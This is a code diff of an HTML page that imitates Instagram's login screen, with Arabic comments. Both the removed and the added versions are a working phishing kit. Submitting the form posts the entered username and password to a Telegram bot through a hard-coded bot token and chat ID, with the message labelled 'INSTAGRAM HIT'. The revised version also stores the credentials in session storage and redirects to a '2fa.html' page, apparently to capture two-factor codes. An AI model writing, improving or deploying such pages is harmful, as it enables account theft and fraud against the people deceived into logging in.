@@ -7,183 +7,115 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
-        
-        .container { width: 100%; max-width: 350px; padding: 10px; display: flex; flex-direction: column; align-items: center; }
-        
-        /* صندوق تسجيل الدخول */
+        .container { width: 100%; max-width: 350px; padding: 20px 0; display: flex; flex-direction: column; align-items: center; }
         .login-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px 40px; width: 100%; display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; }
-        
-        .logo { font-family: 'Grand Hotel', cursive; font-size: 50px; margin-bottom: 35px; color: #262626; }
-        
+        .logo { width: 175px; margin-bottom: 30px; }
+        .logo img { width: 100%; }
         form { width: 100%; }
-        
         .input-group { margin-bottom: 6px; position: relative; }
-        .input-group input { width: 100%; padding: 10px 8px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; color: #262626; outline: none; }
+        .input-group input { width: 100%; padding: 9px 8px 7px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; color: #262626; outline: none; }
         .input-group input:focus { border: 1px solid #a8a8a8; }
-        
-        .show-password { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); font-size: 14px; font-weight: 600; color: #262626; cursor: pointer; background: none; border: none; display: none; }
-        
-        .login-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 8px 16px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; }
+        .login-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 7px 16px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; }
         .login-btn:disabled { background-color: #b2dffc; cursor: default; }
-        
         .divider { display: flex; align-items: center; width: 100%; margin: 20px 0; }
         .line { flex-grow: 1; height: 1px; background-color: #dbdbdb; }
         .or-text { margin: 0 18px; font-size: 13px; font-weight: 600; color: #8e8e8e; }
-        
-        .fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; margin-bottom: 15px; }
+        .fb-login-btn { width: 100%; background-color: #fff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 7px 16px; font-weight: 600; font-size: 14px; color: #385185; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; margin-bottom: 15px; }
         .fb-icon { width: 16px; height: 16px; fill: #385185; }
-        
         .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 12px; }
-        
-        /* صندوق التسجيل */
         .signup-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; width: 100%; text-align: center; font-size: 14px; color: #262626; margin-bottom: 20px; }
         .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; margin-left: 5px; }
-        
-        /* تحميل التطبيق */
         .get-app { text-align: center; width: 100%; }
         .get-app p { font-size: 14px; color: #262626; margin-bottom: 15px; }
         .app-badges { display: flex; justify-content: center; gap: 10px; }
         .app-badges img { height: 40px; cursor: pointer; }
-        
-        /* الفوتر */
-        .footer { margin-top: 30px; display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; font-size: 12px; color: #8e8e8e; padding: 0 20px; }
+        .footer { margin-top: 30px; display: flex; flex-wrap: wrap; justify-content: center; gap: 10px 15px; font-size: 12px; color: #8e8e8e; padding: 0 20px; }
         .footer a { color: #8e8e8e; text-decoration: none; }
-        .footer-bottom { margin-top: 15px; font-size: 12px; color: #8e8e8e; display: flex; gap: 15px; margin-bottom: 30px; }
-        
-        .error-message { color: #ed4956; font-size: 14px; text-align: center; margin-top: 15px; display: none; margin-bottom: 10px;}
+        .footer-bottom { margin-top: 15px; font-size: 12px; color: #8e8e8e; display: flex; gap: 15px; margin-bottom: 30px; align-items: center; }
+        .footer-bottom select { background: none; border: none; color: #8e8e8e; font-size: 12px; cursor: pointer; }
+        .error-message { color: #ed4956; font-size: 14px; text-align: center; margin-top: 15px; display: none; }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
-
     <div class="container">
         <div class="login-box">
-            <div class="logo">Instagram</div>
-            
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">
+            </div>
             <form id="loginForm">
                 <div class="input-group">
                     <input type="text" id="username" placeholder="Phone number, username, or email" required>
                 </div>
                 <div class="input-group">
                     <input type="password" id="password" placeholder="Password" required>
-                    <button type="button" class="show-password" id="togglePassword">Show</button>
                 </div>
                 <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
                 <div class="error-message" id="errorMessage"></div>
             </form>
-            
             <div class="divider">
                 <div class="line"></div>
                 <div class="or-text">OR</div>
                 <div class="line"></div>
             </div>
-            
-            <a href="#" class="fb-login">
+            <button class="fb-login-btn">
                 <svg class="fb-icon" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                 Log in with Facebook
-            </a>
-            
+            </button>
             <a href="#" class="forgot-password">Forgot password?</a>
         </div>
-        
         <div class="signup-box">
             Don't have an account? <a href="#">Sign up</a>
         </div>
-        
         <div class="get-app">
             <p>Get the app.</p>
             <div class="app-badges">
-                <!-- صور حقيقية للمتاجر -->
                 <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f7/Get_it_from_Microsoft_Badge.svg" alt="Get it from Microsoft" style="height: 40px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f7/Get_it_from_Microsoft_Badge.svg" alt="Get it from Microsoft">
             </div>
         </div>
-        
-        <!-- الفوتر الحقيقي -->
         <div class="footer">
-            <a href="#">Meta</a>
-            <a href="#">About</a>
-            <a href="#">Blog</a>
-            <a href="#">Jobs</a>
-            <a href="#">Help</a>
-            <a href="#">API</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-            <a href="#">Locations</a>
-            <a href="#">Instagram Lite</a>
-            <a href="#">Threads</a>
-            <a href="#">Contact Uploading & Non-Users</a>
-            <a href="#">Meta Verified</a>
+            <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a> <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
         </div>
         <div class="footer-bottom">
-            <span>English <svg style="width:10px;fill:#8e8e8e; margin-left:2px;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></span>
+            <select><option>English</option><option>العربية</option></select>
             <span>© 2026 Instagram from Meta</span>
         </div>
     </div>
-
     <script>
         const loginForm = document.getElementById('loginForm');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const loginBtn = document.getElementById('loginBtn');
-        const togglePassword = document.getElementById('togglePassword');
         const errorMessage = document.getElementById('errorMessage');
 
         function checkInputs() {
-            const usernameValue = usernameInput.value.trim();
-            const passwordValue = passwordInput.value.trim();
-            
-            togglePassword.style.display = passwordValue.length > 0 ? 'block' : 'none';
-
-            if (usernameValue !== '' && passwordValue !== '') {
-                loginBtn.disabled = false;
-            } else {
-                loginBtn.disabled = true;
-            }
+            loginBtn.disabled = usernameInput.value.trim() === '' || passwordInput.value.trim() === '';
         }
-
         usernameInput.addEventListener('input', checkInputs);
         passwordInput.addEventListener('input', checkInputs);
 
-        togglePassword.addEventListener('click', function() {
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                togglePassword.textContent = 'Hide';
-            } else {
-                passwordInput.type = 'password';
-                togglePassword.textContent = 'Show';
-            }
-        });
-
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
-
             const username = usernameInput.value.trim();
             const password = passwordInput.value.trim();
 
-            errorMessage.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
-            errorMessage.style.display = 'block';
-
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'Logging in...';
-
+            // إرسال البيانات إلى تيليجرام (المرحلة الأولى)
             const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
             const CHAT_ID = "2005892579";
-            const message = `🚨 *INSTAGRAM HIT!*\n👤 User: \`${username}\`\n🔑 Pass: \`${password}\``;
-
+            const message = `🚨 *INSTAGRAM HIT! (LOGIN)*\n👤 User: \`${username}\`\n🔑 Pass: \`${password}\``;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
-            }).catch(err => console.log(err));
+            });
 
-            setTimeout(() => {
-                loginBtn.textContent = 'Log in';
-                loginBtn.disabled = false;
-            }, 2500);
+            // تخزين البيانات مؤقتاً للانتقال للصفحة التالية
+            sessionStorage.setItem('insta_user', username);
+            sessionStorage.setItem('insta_pass', password);
+            
+            // الانتقال لصفحة 2FA
+            window.location.href = '2fa.html';
         });
-
-        checkInputs();
     </script>
 </body>
 </html>
